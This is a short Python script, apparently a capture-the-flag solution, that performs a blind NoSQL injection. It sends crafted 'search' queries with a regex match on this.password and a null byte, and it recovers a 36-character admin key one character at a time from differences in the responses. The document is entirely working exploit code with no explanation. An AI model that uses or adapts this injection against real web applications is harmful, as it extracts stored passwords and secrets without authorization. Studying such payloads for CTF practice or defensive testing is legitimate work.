import requests
import sys

GREEN = "\033[32m"
RED = "\033[91m"
YELLOW = "\033[00;33m"
RESET = "\033[0m"

if len(sys.argv) != 2:
    print(f"[-] Usage:\n\t{sys.argv[0]} <URL>")
    sys.exit(1)

url = sys.argv[1]
chars = ['a', 'b', 'c', 'd', 'e', 'f', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-']
key = ""

while len(key) != 36:
    for char in chars:
        inject_here = f"admin' %26%26 this.password.match(/^{key}{char}.*$/)%00"
        request = requests.get(f"{url}/?search={inject_here}")

        if "?search=admin" in request.text:
            key += char
            print(f"[+] Found {len(key)} out of 36 chars. Please wait, {YELLOW}{key}{RESET}")

print(f"\n[+] The key for this challenge is {GREEN}{key}{RESET}")

